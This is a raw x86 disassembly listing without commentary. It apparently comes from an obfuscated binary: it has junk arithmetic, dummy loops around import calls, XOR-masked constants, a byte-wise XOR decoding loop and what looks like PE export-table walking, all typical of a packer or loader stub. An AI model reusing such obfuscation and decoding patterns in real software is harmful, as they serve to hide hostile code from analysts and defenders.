  41af9f:	mov    ecx,DWORD PTR ds:0x42a01c
  41afa5:	dec    ecx
  41afa6:	mov    DWORD PTR ds:0x42a01c,ecx
  41afac:	mov    ecx,DWORD PTR ds:0x42a01c
  41afb2:	dec    ecx
  41afb3:	mov    DWORD PTR ds:0x42a01c,ecx
  41afb9:	jmp    0x41af67
  41afbe:	mov    DWORD PTR [ebp-0x24],eax
  41afc1:	add    DWORD PTR ds:0x428014,ecx
  41afc7:	mov    eax,ds:0x421cee
  41afcc:	mov    ecx,DWORD PTR ds:0x421a5e
  41afd2:	mov    ecx,DWORD PTR [ecx]
  41afd4:	adc    DWORD PTR ds:0x42a008,ecx
  41afda:	mov    eax,DWORD PTR [eax]
  41afdc:	and    DWORD PTR ds:0x42a01c,0x0
  41afe6:	jmp    0x41aff8
  41afeb:	mov    ecx,DWORD PTR ds:0x42a01c
  41aff1:	inc    ecx
  41aff2:	mov    DWORD PTR ds:0x42a01c,ecx
  41aff8:	cmp    DWORD PTR ds:0x42a01c,0x10
  41afff:	jae    0x41b0fe
  41b005:	cmp    DWORD PTR ds:0x42a01c,0x8
  41b00c:	jne    0x41b022
  41b012:	push   0x4238a2
  41b017:	push   0x423822
  41b01c:	call   DWORD PTR ds:0x424030
  41b022:	cmp    DWORD PTR ds:0x42a01c,0x7
  41b029:	jne    0x41b03e
  41b02f:	xor    ecx,ecx
  41b031:	xor    ecx,DWORD PTR ds:0x42a01c
  41b037:	inc    ecx
  41b038:	mov    DWORD PTR ds:0x42a01c,ecx
  41b03e:	jmp    0x41afeb
  41b043:	and    DWORD PTR ds:0x42901c,0x0
  41b04d:	jmp    0x41b05f
  41b052:	mov    ecx,DWORD PTR ds:0x42901c
  41b058:	inc    ecx
  41b059:	mov    DWORD PTR ds:0x42901c,ecx
  41b05f:	cmp    DWORD PTR ds:0x42901c,0x11
  41b066:	jae    0x41b0fe
  41b06c:	cmp    DWORD PTR ds:0x42901c,0x7
  41b073:	jne    0x41b099
  41b079:	push   DWORD PTR [ebp-0x10]
  41b07c:	push   DWORD PTR [ebp-0x18]
  41b07f:	push   0x2cae
  41b084:	push   0x19d0
  41b089:	push   0x7b35
  41b08e:	push   0x42c01c
  41b093:	call   DWORD PTR ds:0x424038
  41b099:	cmp    DWORD PTR ds:0x42901c,0x6
  41b0a0:	jne    0x41b0b3
  41b0a6:	mov    ecx,DWORD PTR ds:0x42901c
  41b0ac:	inc    ecx
  41b0ad:	mov    DWORD PTR ds:0x42901c,ecx
  41b0b3:	jmp    0x41b052
  41b0b8:	mov    DWORD PTR ds:0x42c00c,0x11
  41b0c2:	cmp    DWORD PTR ds:0x42c00c,0x0
  41b0c9:	je     0x41b0fe
  41b0cf:	cmp    DWORD PTR ds:0x42c00c,0x18
  41b0d6:	jne    0x41b0ec
  41b0dc:	push   0x42a008
  41b0e1:	push   0x6229
  41b0e6:	call   DWORD PTR ds:0x42403c
  41b0ec:	mov    ecx,DWORD PTR ds:0x42c00c
  41b0f2:	dec    ecx
  41b0f3:	mov    DWORD PTR ds:0x42c00c,ecx
  41b0f9:	jmp    0x41b0c2
  41b0fe:	mov    DWORD PTR [ebp-0x28],eax
  41b101:	mov    DWORD PTR [ebp-0x34],0xf89c87b6
  41b108:	mov    eax,DWORD PTR [ebp-0x34]
  41b10b:	xor    eax,esi
  41b10d:	add    eax,edi
  41b10f:	sbb    DWORD PTR ds:0x42a000,0x3656
  41b119:	mov    DWORD PTR [ebp-0x38],eax
  41b11c:	mov    eax,ds:0x421c66
  41b121:	mov    DWORD PTR [ebp-0x38],eax
  41b124:	or     eax,0x6382
  41b129:	mov    eax,DWORD PTR [ebp-0x24]
  41b12c:	and    DWORD PTR ds:0x42a008,0x0
  41b136:	mov    ecx,DWORD PTR ds:0x42a008
  41b13c:	inc    ecx
  41b13d:	mov    DWORD PTR ds:0x42a008,ecx
  41b143:	cmp    DWORD PTR ds:0x42a008,0x9
  41b14a:	jne    0x41b15e
  41b150:	push   DWORD PTR [ebp-0x14]
  41b153:	push   0x4237fd
  41b158:	call   DWORD PTR ds:0x424040
  41b15e:	cmp    DWORD PTR ds:0x42a008,0x8
  41b165:	jne    0x41b17a
  41b16b:	xor    ecx,ecx
  41b16d:	add    ecx,DWORD PTR ds:0x42a008
  41b173:	inc    ecx
  41b174:	mov    DWORD PTR ds:0x42a008,ecx
  41b17a:	cmp    DWORD PTR ds:0x42a008,0x17
  41b181:	jb     0x41b136
  41b187:	mov    DWORD PTR [ebp-0x14],eax
  41b18a:	mov    eax,DWORD PTR [ebp-0x14]
  41b18d:	dec    DWORD PTR ds:0x42c000
  41b193:	push   0x4
  41b195:	and    ecx,DWORD PTR ds:0x42a018
  41b19b:	pop    ecx
  41b19c:	sbb    DWORD PTR ds:0x42b000,0x429004
  41b1a6:	sub    ecx,eax
  41b1a8:	xor    DWORD PTR ds:0x42a01c,0x102e
  41b1b2:	add    ecx,DWORD PTR [ebp-0x28]
  41b1b5:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  41b1bc:	adc    eax,0x5aaa
  41b1c1:	mov    DWORD PTR [ebp-0x20],ecx
  41b1c4:	mov    DWORD PTR [ebp-0x94],0xf89c85ba
  41b1ce:	and    DWORD PTR ds:0x428010,0x0
  41b1d8:	jmp    0x41b1eb
  41b1dd:	xor    eax,eax
  41b1df:	add    eax,DWORD PTR ds:0x428010
  41b1e5:	inc    eax
  41b1e6:	mov    ds:0x428010,eax
  41b1eb:	cmp    DWORD PTR ds:0x428010,0x10
  41b1f2:	jae    0x41b22d
  41b1f8:	cmp    DWORD PTR ds:0x428010,0x9
  41b1ff:	jne    0x41b210
  41b205:	push   0x423814
  41b20a:	call   DWORD PTR ds:0x424044
  41b210:	cmp    DWORD PTR ds:0x428010,0x8
  41b217:	jne    0x41b228
  41b21d:	mov    eax,ds:0x428010
  41b222:	inc    eax
  41b223:	mov    ds:0x428010,eax
  41b228:	jmp    0x41b1dd
  41b22d:	mov    eax,DWORD PTR [ebp-0x14]
  41b230:	sbb    DWORD PTR ds:0x42a018,0x429014
  41b23a:	mov    DWORD PTR [ebp-0x90],eax
  41b240:	dec    eax
  41b241:	mov    eax,DWORD PTR [ebp-0x20]
  41b244:	mov    DWORD PTR [ebp-0x8c],eax
  41b24a:	add    DWORD PTR ds:0x42c00c,0x20f
  41b254:	mov    eax,DWORD PTR [ebp-0x2c]
  41b257:	xor    DWORD PTR ds:0x42b00c,0x3fc9
  41b261:	xor    eax,esi
  41b263:	add    eax,edi
  41b265:	mov    DWORD PTR [ebp-0x88],eax
  41b26b:	lea    eax,[ebp-0x50]
  41b26e:	or     DWORD PTR ds:0x42b014,0x1a32
  41b278:	mov    DWORD PTR [ebp-0x84],eax
  41b27e:	mov    eax,DWORD PTR [ebp-0x94]
  41b284:	xor    DWORD PTR ds:0x42b010,0x42a00c
  41b28e:	xor    eax,esi
  41b290:	xor    DWORD PTR ds:0x42900c,0x429018
  41b29a:	add    eax,edi
  41b29c:	and    DWORD PTR ds:0x428020,0x42c01c
  41b2a6:	mov    DWORD PTR [ebp-0x94],eax
  41b2ac:	and    DWORD PTR ds:0x42a000,0x429010
  41b2b6:	lea    eax,[ebp-0x94]
  41b2bc:	adc    DWORD PTR ds:0x42b018,0x42c018
  41b2c6:	push   eax
  41b2c7:	movzx  eax,WORD PTR ds:0x42b01c
  41b2ce:	add    DWORD PTR ds:0x42a008,eax
  41b2d4:	mov    eax,DWORD PTR [ebp+0xc]
  41b2d7:	xor    eax,esi
  41b2d9:	add    DWORD PTR ds:0x428028,0x2102
  41b2e3:	add    eax,edi
  41b2e5:	sub    DWORD PTR ds:0x429010,0x36a
  41b2ef:	push   eax
  41b2f0:	mov    eax,ds:0x421c86
  41b2f5:	adc    DWORD PTR ds:0x428024,0x6674
  41b2ff:	push   0x421bdc
  41b304:	and    DWORD PTR ds:0x42a014,0x6ed
  41b30e:	push   DWORD PTR [eax]
  41b310:	add    DWORD PTR ds:0x42a000,0x42900c
  41b31a:	call   0x405c89
  41b31f:	or     eax,DWORD PTR ds:0x42901c
  41b325:	mov    eax,DWORD PTR [ebp-0x14]
  41b328:	and    ecx,0x4079
  41b32e:	mov    ecx,DWORD PTR [ebp-0x20]
  41b331:	sub    DWORD PTR ds:0x42b01c,0xab5
  41b33b:	mov    DWORD PTR [ebp-0x44],ecx
  41b33e:	sbb    DWORD PTR ds:0x42b01c,edi
  41b344:	mov    ecx,DWORD PTR [ebp+0x8]
  41b347:	xor    ecx,esi
  41b349:	add    DWORD PTR ds:0x42a018,0x42a000
  41b353:	mov    DWORD PTR [ebp-0x34],eax
  41b356:	add    ecx,edi
  41b358:	jmp    0x41b6c6
  41b35d:	sub    DWORD PTR ds:0x42a018,edi
  41b363:	lea    edx,[ecx+eax*1]
  41b366:	mov    DWORD PTR [ebp-0x28],edx
  41b369:	mov    edx,DWORD PTR [ebp-0x44]
  41b36c:	mov    ebx,DWORD PTR ds:0x429004
  41b372:	add    DWORD PTR ds:0x42c008,ebx
  41b378:	sub    edx,ecx
  41b37a:	mov    DWORD PTR ds:0x42b004,0x1e
  41b384:	cmp    DWORD PTR ds:0x42b004,0x0
  41b38b:	je     0x41b3c5
  41b391:	cmp    DWORD PTR ds:0x42b004,0x28
  41b398:	jne    0x41b3b3
  41b39e:	push   0x3a6a
  41b3a3:	push   0x42b010
  41b3a8:	push   0x423972
  41b3ad:	call   DWORD PTR ds:0x424048
  41b3b3:	mov    ebx,DWORD PTR ds:0x42b004
  41b3b9:	dec    ebx
  41b3ba:	mov    DWORD PTR ds:0x42b004,ebx
  41b3c0:	jmp    0x41b384
  41b3c5:	mov    DWORD PTR [ebp-0x24],edx
  41b3c8:	mov    edx,DWORD PTR [ebp-0x24]
  41b3cb:	and    DWORD PTR ds:0x428008,edi
  41b3d1:	mov    DWORD PTR [ebp-0x14],edx
  41b3d4:	not    edx
  41b3d6:	mov    edx,DWORD PTR [ebp-0x28]
  41b3d9:	mov    DWORD PTR ds:0x42800c,0x11
  41b3e3:	cmp    DWORD PTR ds:0x42800c,0x0
  41b3ea:	je     0x41b499
  41b3f0:	cmp    DWORD PTR ds:0x42800c,0x8
  41b3f7:	jne    0x41b40b
  41b3fd:	push   0x42a010
  41b402:	push   DWORD PTR [ebp-0x28]
  41b405:	call   DWORD PTR ds:0x424014
  41b40b:	cmp    DWORD PTR ds:0x42800c,0x9
  41b412:	jne    0x41b425
  41b418:	mov    ebx,DWORD PTR ds:0x42800c
  41b41e:	dec    ebx
  41b41f:	mov    DWORD PTR ds:0x42800c,ebx
  41b425:	xor    ebx,ebx
  41b427:	or     ebx,DWORD PTR ds:0x42800c
  41b42d:	dec    ebx
  41b42e:	mov    DWORD PTR ds:0x42800c,ebx
  41b434:	jmp    0x41b3e3
  41b439:	mov    DWORD PTR ds:0x429004,0x17
  41b443:	cmp    DWORD PTR ds:0x429004,0x0
  41b44a:	je     0x41b499
  41b450:	cmp    DWORD PTR ds:0x429004,0x25
  41b457:	jne    0x41b485
  41b45d:	push   0x85b6
  41b462:	push   0x42a018
  41b467:	push   DWORD PTR [ebp-0x24]
  41b46a:	push   0x42c000
  41b46f:	push   0x5138
  41b474:	push   DWORD PTR [ebp-0x24]
  41b477:	push   0x4b55
  41b47c:	push   DWORD PTR [ebp-0x24]
  41b47f:	call   DWORD PTR ds:0x424018
  41b485:	xor    ebx,ebx
  41b487:	add    ebx,DWORD PTR ds:0x429004
  41b48d:	dec    ebx
  41b48e:	mov    DWORD PTR ds:0x429004,ebx
  41b494:	jmp    0x41b443
  41b499:	mov    DWORD PTR [ebp-0x3c],0xf89c85b6
  41b4a0:	mov    DWORD PTR [ebp-0x40],edx
  41b4a3:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  41b4aa:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4ad:	xor    edx,esi
  41b4af:	add    edx,edi
  41b4b1:	mov    DWORD PTR [ebp-0x10],edx
  41b4b4:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4b7:	xor    edx,esi
  41b4b9:	add    edx,edi
  41b4bb:	mov    DWORD PTR [ebp-0x8],edx
  41b4be:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41b4c5:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  41b4cc:	mov    edx,DWORD PTR [ebp-0x3c]
  41b4cf:	mov    ebx,DWORD PTR [ebp-0x14]
  41b4d2:	xor    edx,esi
  41b4d4:	add    edx,edi
  41b4d6:	cmp    ebx,edx
  41b4d8:	je     0x41b6ba
  41b4de:	mov    eax,DWORD PTR [ebp-0x18]
  41b4e1:	xor    eax,esi
  41b4e3:	mov    edx,0xffcd8d25
  41b4e8:	sub    edx,eax
  41b4ea:	add    edx,DWORD PTR [ebp-0x14]
  41b4ed:	mov    eax,DWORD PTR [ebp-0x18]
  41b4f0:	mov    ebx,DWORD PTR [ebp-0x10]
  41b4f3:	xor    eax,esi
  41b4f5:	add    eax,edi
  41b4f7:	imul   eax,ebx
  41b4fa:	cmp    eax,edx
  41b4fc:	ja     0x41b6b7
  41b502:	mov    edx,DWORD PTR [ebp-0x10]
  41b505:	mov    eax,DWORD PTR [ebp-0x14]
  41b508:	mov    ebx,DWORD PTR [ebp-0x28]
  41b50b:	sub    eax,edx
  41b50d:	xor    ebx,esi
  41b50f:	xor    edx,edx
  41b511:	add    ebx,edi
  41b513:	div    ebx
  41b515:	mov    DWORD PTR [ebp-0x8],eax
  41b518:	mov    eax,DWORD PTR [ebp-0x2c]
  41b51b:	mov    edx,DWORD PTR [ebp-0x8]
  41b51e:	xor    eax,esi
  41b520:	add    eax,edi
  41b522:	cmp    edx,eax
  41b524:	jbe    0x41b534
  41b52a:	mov    eax,DWORD PTR [ebp-0x2c]
  41b52d:	xor    eax,esi
  41b52f:	add    eax,edi
  41b531:	mov    DWORD PTR [ebp-0x8],eax
  41b534:	mov    eax,DWORD PTR [ebp-0x28]
  41b537:	mov    edx,DWORD PTR [ebp-0x8]
  41b53a:	xor    eax,esi
  41b53c:	add    eax,edi
  41b53e:	imul   eax,edx
  41b541:	mov    DWORD PTR [ebp-0x8],eax
  41b544:	mov    eax,DWORD PTR [ebp-0x3c]
  41b547:	mov    edx,DWORD PTR [ebp-0x8]
  41b54a:	xor    eax,esi
  41b54c:	add    eax,edi
  41b54e:	cmp    edx,eax
  41b550:	je     0x41b6a0
  41b556:	mov    eax,DWORD PTR [ebp-0x8]
  41b559:	mov    DWORD PTR [ebp-0x20],eax
  41b55c:	mov    eax,DWORD PTR [ebp-0x10]
  41b55f:	add    eax,DWORD PTR [ebp-0x40]
  41b562:	mov    DWORD PTR [ebp-0x24],0xf89c85b6
  41b569:	mov    DWORD PTR [ebp-0x8],eax
  41b56c:	mov    eax,0xf89c85b5
  41b571:	mov    DWORD PTR [ebp-0x1c],eax
  41b574:	mov    DWORD PTR [ebp-0x38],0xf89c85b4
  41b57b:	mov    DWORD PTR [ebp-0x30],eax
  41b57e:	mov    eax,DWORD PTR [ebp-0x24]
  41b581:	xor    eax,esi
  41b583:	add    eax,edi
  41b585:	jmp    0x41b654
  41b58a:	mov    DWORD PTR [ebp-0x48],0xf89c85bd
  41b591:	mov    DWORD PTR [ebp-0x4c],0xf89c85a7
  41b598:	mov    eax,DWORD PTR [ebp-0x30]
  41b59b:	mov    edx,DWORD PTR [ebp-0xc]
  41b59e:	xor    eax,esi
  41b5a0:	add    eax,edi
  41b5a2:	imul   eax,edx
  41b5a5:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5a8:	xor    edx,esi
  41b5aa:	add    eax,edx
  41b5ac:	mov    edx,DWORD PTR [ebp-0x8]
  41b5af:	mov    al,BYTE PTR [eax+edx*1+0x3272db]
  41b5b6:	mov    BYTE PTR [ebp-0x1],al
  41b5b9:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5bc:	mov    edx,DWORD PTR [ebp-0x1c]
  41b5bf:	xor    eax,esi
  41b5c1:	xor    edx,esi
  41b5c3:	lea    ebx,[eax+edx*1+0x64e5b6]
  41b5ca:	mov    eax,DWORD PTR [ebp-0xc]
  41b5cd:	xor    edx,edx
  41b5cf:	div    ebx
  41b5d1:	mov    eax,DWORD PTR [ebp-0x1c]
  41b5d4:	xor    eax,esi
  41b5d6:	add    eax,edi
  41b5d8:	cmp    edx,eax
  41b5da:	mov    eax,DWORD PTR [ebp-0x30]
  41b5dd:	mov    edx,DWORD PTR [ebp-0xc]
  41b5e0:	jne    0x41b5fc
  41b5e6:	xor    eax,esi
  41b5e8:	add    eax,edi
  41b5ea:	imul   eax,edx
  41b5ed:	mov    edx,DWORD PTR [ebp-0x8]
  41b5f0:	movzx  eax,BYTE PTR [eax+edx*1]
  41b5f4:	mov    edx,DWORD PTR [ebp-0x48]
  41b5f7:	jmp    0x41b60d
  41b5fc:	xor    eax,esi
  41b5fe:	add    eax,edi
  41b600:	imul   eax,edx
  41b603:	mov    edx,DWORD PTR [ebp-0x8]
  41b606:	movzx  eax,BYTE PTR [eax+edx*1]
  41b60a:	mov    edx,DWORD PTR [ebp-0x4c]
  41b60d:	xor    edx,esi
  41b60f:	lea    eax,[edx+eax*1+0x3272db]
  41b616:	movzx  edx,BYTE PTR [ebp-0x1]
  41b61a:	xor    edx,eax
  41b61c:	mov    BYTE PTR [ebp-0x1],dl
  41b61f:	mov    al,BYTE PTR [ebp-0x1]
  41b622:	mov    edx,DWORD PTR [ebp-0x30]
  41b625:	mov    ebx,DWORD PTR [ebp-0xc]
  41b628:	xor    edx,esi
  41b62a:	add    edx,edi
  41b62c:	imul   edx,ebx
  41b62f:	mov    ebx,DWORD PTR [ebp-0x1c]
  41b632:	xor    ebx,esi
  41b634:	add    edx,ebx
  41b636:	mov    ebx,DWORD PTR [ebp-0x8]
  41b639:	mov    BYTE PTR [edx+ebx*1+0x3272db],al
  41b640:	mov    eax,DWORD PTR [ebp-0x38]
  41b643:	mov    edx,DWORD PTR [ebp-0x1c]
  41b646:	xor    eax,esi
  41b648:	xor    edx,esi
  41b64a:	add    eax,edi
  41b64c:	add    edx,edi
  41b64e:	imul   eax,edx
  41b651:	add    eax,DWORD PTR [ebp-0xc]
  41b654:	mov    DWORD PTR [ebp-0xc],eax
  41b657:	mov    eax,DWORD PTR [ebp-0xc]
  41b65a:	mov    edx,DWORD PTR [ebp-0x20]
  41b65d:	sub    eax,edi
  41b65f:	sub    edx,edi
  41b661:	xor    eax,esi
  41b663:	xor    edx,esi
  41b665:	cmp    edx,eax
  41b667:	jne    0x41b58a
  41b66d:	mov    eax,DWORD PTR [ebp-0x1c]
  41b670:	mov    edx,DWORD PTR [ebp-0x20]
  41b673:	xor    eax,esi
  41b675:	add    eax,edi
  41b677:	imul   eax,edx
  41b67a:	mov    edx,DWORD PTR [ebp-0x24]
  41b67d:	xor    edx,esi
  41b67f:	add    edx,edi
  41b681:	or     eax,edx
  41b683:	mov    edx,DWORD PTR [ebp-0x18]
  41b686:	xor    edx,esi
  41b688:	add    eax,edx
  41b68a:	mov    edx,DWORD PTR [ebp-0x18]
  41b68d:	xor    edx,esi
  41b68f:	add    eax,edx
  41b691:	mov    edx,DWORD PTR [ebp-0x10]
  41b694:	lea    eax,[eax+edx*1+0x64e5b6]
  41b69b:	jmp    0x41b6af
  41b6a0:	mov    eax,DWORD PTR [ebp-0x18]
  41b6a3:	mov    edx,DWORD PTR [ebp-0x10]
  41b6a6:	xor    eax,esi
  41b6a8:	lea    eax,[eax+edx*1+0x3272db]
  41b6af:	mov    DWORD PTR [ebp-0x10],eax
  41b6b2:	jmp    0x41b4de
  41b6b7:	mov    eax,DWORD PTR [ebp-0x34]
  41b6ba:	mov    edx,DWORD PTR [ebp+0xc]
  41b6bd:	xor    edx,esi
  41b6bf:	lea    ecx,[ecx+edx*1+0x3272db]
  41b6c6:	lea    edx,[ecx-0x3272db]
  41b6cc:	xor    edx,esi
  41b6ce:	cmp    edx,0xf89c95b6
  41b6d4:	jne    0x41b35d
  41b6da:	mov    ecx,DWORD PTR [ebp+0x8]
  41b6dd:	mov    edx,DWORD PTR [ebp+0xc]
  41b6e0:	mov    ebx,DWORD PTR [ebp+0x8]
  41b6e3:	xor    edx,esi
  41b6e5:	mov    dl,BYTE PTR [edx+eax*1+0x3272db]
  41b6ec:	xor    ecx,esi
  41b6ee:	mov    cl,BYTE PTR [ecx+eax*1+0x3272db]
  41b6f5:	xor    ebx,esi
  41b6f7:	mov    BYTE PTR [ebx+eax*1+0x3272db],dl
  41b6fe:	mov    edx,DWORD PTR [ebp+0xc]
  41b701:	xor    edx,esi
  41b703:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  41b70a:	mov    eax,DWORD PTR [ebp+0xc]
  41b70d:	xor    eax,esi
  41b70f:	add    eax,edi
  41b711:	pop    edi
  41b712:	pop    esi
  41b713:	pop    ebx
  41b714:	leave  
  41b715:	ret    0x8
  41b718:	push   ebp
  41b719:	mov    ebp,esp
  41b71b:	mov    DWORD PTR ds:0x421d76,0xf89c85b5
  41b725:	pop    ebp
  41b726:	jmp    0x41b89a
  41b72b:	push   ebp
  41b72c:	mov    ebp,esp
  41b72e:	push   ecx
  41b72f:	and    DWORD PTR ds:0x42c010,0x0
  41b739:	jmp    0x41b74b
  41b73e:	mov    edx,DWORD PTR ds:0x42c010
  41b744:	inc    edx
  41b745:	mov    DWORD PTR ds:0x42c010,edx
  41b74b:	cmp    DWORD PTR ds:0x42c010,0x19
  41b752:	jae    0x41b793
  41b758:	cmp    DWORD PTR ds:0x42c010,0x9
  41b75f:	jne    0x41b76e
  41b765:	push   DWORD PTR [ebp-0x18]
  41b768:	call   DWORD PTR ds:0x42401c
  41b76e:	cmp    DWORD PTR ds:0x42c010,0x8
  41b775:	jne    0x41b788
  41b77b:	mov    edx,DWORD PTR ds:0x42c010
  41b781:	inc    edx
  41b782:	mov    DWORD PTR ds:0x42c010,edx
  41b788:	jmp    0x41b73e
  41b78d:	or     DWORD PTR ds:0x42c004,ebx
  41b793:	push   ecx
  41b794:	movzx  eax,BYTE PTR ds:0x42b00c
  41b79b:	and    DWORD PTR ds:0x42a01c,eax
  41b7a1:	mov    DWORD PTR [ebp-0x8],0xf89c85b6
  41b7a8:	mov    DWORD PTR [ebp-0x4],0xf89c85b5
  41b7af:	mov    DWORD PTR ds:0x428008,0x13
  41b7b9:	cmp    DWORD PTR ds:0x428008,0x0
  41b7c0:	je     0x41b7ef
  41b7c6:	cmp    DWORD PTR ds:0x428008,0x20
  41b7cd:	jne    0x41b7df
  41b7d3:	push   DWORD PTR [ebp-0x14]
  41b7d6:	push   DWORD PTR [ebp-0x1c]
  41b7d9:	call   DWORD PTR ds:0x424020
  41b7df:	mov    eax,ds:0x428008
  41b7e4:	dec    eax
  41b7e5:	mov    ds:0x428008,eax
  41b7ea:	jmp    0x41b7b9
  41b7ef:	mov    eax,DWORD PTR [ebp-0x4]
  41b7f2:	and    DWORD PTR ds:0x429008,0x428020
  41b7fc:	push   esi
  41b7fd:	adc    DWORD PTR ds:0x42c000,0x1310
  41b807:	mov    esi,DWORD PTR [ebp-0x8]
  41b80a:	mov    edx,0x7510893
  41b80f:	xor    eax,edx
  41b811:	mov    ecx,DWORD PTR ds:0x42a000
  41b817:	and    DWORD PTR ds:0x429014,ecx
  41b81d:	xor    esi,edx
  41b81f:	mov    ecx,DWORD PTR ds:0x423ac1
  41b825:	mov    ecx,DWORD PTR [ecx]
  41b827:	sbb    DWORD PTR ds:0x42b00c,ecx
  41b82d:	mov    ecx,0x3272db
  41b832:	add    esi,ecx
  41b834:	add    eax,ecx
  41b836:	imul   eax,esi
  41b839:	mov    esi,DWORD PTR [ebp+0xc]
  41b83c:	cmp    esi,eax
  41b83e:	jne    0x41b85a
  41b844:	mov    eax,DWORD PTR [ebp-0x4]
  41b847:	mov    esi,DWORD PTR [ebp-0x8]
  41b84a:	xor    eax,edx
  41b84c:	xor    esi,edx
  41b84e:	add    eax,ecx
  41b850:	add    esi,ecx
  41b852:	imul   eax,esi
  41b855:	jmp    0x41b895
  41b85a:	mov    eax,DWORD PTR [ebp+0xc]
  41b85d:	mov    eax,DWORD PTR [eax+0x78]
  41b860:	mov    DWORD PTR [ebp+0xc],eax
  41b863:	mov    eax,DWORD PTR [ebp-0x4]
  41b866:	mov    esi,DWORD PTR [ebp-0x8]
  41b869:	xor    eax,edx
  41b86b:	xor    esi,edx
  41b86d:	add    eax,ecx
  41b86f:	add    esi,ecx
  41b871:	imul   eax,esi
  41b874:	mov    esi,DWORD PTR [ebp+0xc]
  41b877:	cmp    esi,eax
  41b879:	mov    eax,DWORD PTR [ebp-0x4]
  41b87c:	je     0x41b847
  41b882:	xor    eax,edx
  41b884:	add    eax,ecx
  41b886:	mov    ecx,DWORD PTR [ebp+0xc]
  41b889:	imul   eax,ecx
  41b88c:	add    eax,DWORD PTR [ebp+0x8]
  41b88f:	mov    DWORD PTR [ebp+0xc],eax
  41b892:	mov    eax,DWORD PTR [ebp+0xc]
  41b895:	pop    esi
  41b896:	leave  
  41b897:	ret    0x8
  41b89a:	push   ebp
  41b89b:	mov    ebp,esp
  41b89d:	sub    esp,0x80
  41b8a3:	push   ebx
  41b8a4:	push   esi
  41b8a5:	push   edi
  41b8a6:	mov    DWORD PTR ds:0x42c010,0xf9a
  41b8b0:	mov    DWORD PTR [ebp-0x3c],0x0
  41b8b7:	dec    eax
  41b8b8:	mov    eax,DWORD PTR [ebp-0x18]
  41b8bb:	mov    DWORD PTR [ebp-0x18],eax
  41b8be:	adc    DWORD PTR ds:0x429014,0x42801c
  41b8c8:	push   0x421d7a
  41b8cd:	call   DWORD PTR ds:0x42402c
  41b8d3:	adc    DWORD PTR ds:0x428018,0x3fb
  41b8dd:	push   0x0
  41b8df:	push   0x67
  41b8e1:	sbb    DWORD PTR ds:0x42b008,0x4024
  41b8eb:	push   0xc
  41b8ed:	mov    DWORD PTR ds:0x429000,0x5718
  41b8f7:	push   0x3
  41b8f9:	and    DWORD PTR ds:0x42b004,0x67ab
  41b903:	push   0x2
  41b905:	push   0x78769798
  41b90a:	or     DWORD PTR ds:0x428024,0x42c014
  41b914:	call   DWORD PTR ds:0x42400c
  41b91a:	or     DWORD PTR ds:0x42c000,0x429014
  41b924:	push   0x57658733
  41b929:	and    DWORD PTR ds:0x42c000,0x42900c
  41b933:	call   DWORD PTR ds:0x424008
  41b939:	push   0x97667654
  41b93e:	call   DWORD PTR ds:0x424000
  41b944:	movzx  eax,BYTE PTR ds:0x428004
  41b94b:	mov    eax,DWORD PTR [ebp-0x18]
  41b94e:	cmp    eax,0xf89c85b6
  41b953:	mov    DWORD PTR ds:0x42c018,0x6f46
  41b95d:	jne    0x41ba3b
  41b963:	sub    DWORD PTR ds:0x42b018,0x42901c
  41b96d:	xor    edi,edi
  41b96f:	inc    edi
  41b970:	xor    esi,esi
  41b972:	inc    esi
  41b973:	mov    DWORD PTR ds:0x429018,0x36e4
  41b97d:	mov    DWORD PTR ds:0x421d76,0xf89c85b5
  41b987:	mov    DWORD PTR ds:0x42c004,0x59b7
  41b991:	cmp    edi,0x20
  41b994:	mov    DWORD PTR ds:0x42c000,0x70dd
  41b99e:	jne    0x41ba00
  41b9a4:	mov    DWORD PTR ds:0x428000,0x41f9
  41b9ae:	cmp    esi,edi
  41b9b0:	mov    DWORD PTR ds:0x42901c,0x1be9
  41b9ba:	jne    0x41ba00
  41b9c0:	or     DWORD PTR ds:0x429010,0x42900c
  41b9ca:	push   DWORD PTR [ebp+0x10]
  41b9cd:	and    DWORD PTR ds:0x428004,0x1bdc
  41b9d7:	push   DWORD PTR [ebp+0xc]
  41b9da:	add    DWORD PTR ds:0x428008,0x6df8
  41b9e4:	push   DWORD PTR [ebp+0x8]
  41b9e7:	call   0x41b718
  41b9ec:	mov    ecx,DWORD PTR ds:0x428018
  41b9f2:	mov    ecx,DWORD PTR ds:0x421c66
  41b9f8:	mov    ecx,DWORD PTR [ecx+0x1cc]
  41b9fe:	mov    DWORD PTR [ecx],eax
  41ba00:	mov    DWORD PTR ds:0x42a018,0x7241
  41ba0a:	inc    esi
  41ba0b:	mov    DWORD PTR ds:0x42b01c,0x57c2
  41ba15:	cmp    esi,0x21
  41ba18:	jne    0x41b973
  41ba1e:	mov    DWORD PTR ds:0x42a010,0x26a0
  41ba28:	inc    edi
  41ba29:	cmp    edi,esi
  41ba2b:	mov    DWORD PTR ds:0x429008,0x19e2
  41ba35:	jne    0x41b970
  41ba3b:	mov    edx,0xf89c85b6
  41ba40:	and    DWORD PTR ds:0x42b014,0x0
  41ba4a:	mov    esi,DWORD PTR ds:0x42b014
  41ba50:	inc    esi
  41ba51:	mov    DWORD PTR ds:0x42b014,esi
  41ba57:	cmp    DWORD PTR ds:0x42b014,0x6
  41ba5e:	jne    0x41ba8c
  41ba64:	push   0x429014
  41ba69:	push   0x534b
  41ba6e:	push   DWORD PTR [ebp-0x18]
  41ba71:	push   0x428028
  41ba76:	push   0x4cdf
  41ba7b:	push   0x423992
  41ba80:	push   DWORD PTR [ebp-0x28]
  41ba83:	push   DWORD PTR [ebp-0x10]
  41ba86:	call   DWORD PTR ds:0x424024
  41ba8c:	cmp    DWORD PTR ds:0x42b014,0x5
  41ba93:	jne    0x41baa6
  41ba99:	mov    esi,DWORD PTR ds:0x42b014
  41ba9f:	inc    esi
  41baa0:	mov    DWORD PTR ds:0x42b014,esi
  41baa6:	cmp    DWORD PTR ds:0x42b014,0x11
  41baad:	jb     0x41ba4a
  41bab3:	adc    esi,DWORD PTR ds:0x429000
  41bab9:	mov    DWORD PTR [ebp-0x4],edx
  41babc:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  41bac3:	add    ecx,0x1410
  41bac9:	lea    eax,[ebp-0x44]
  41bacc:	xor    edi,edi
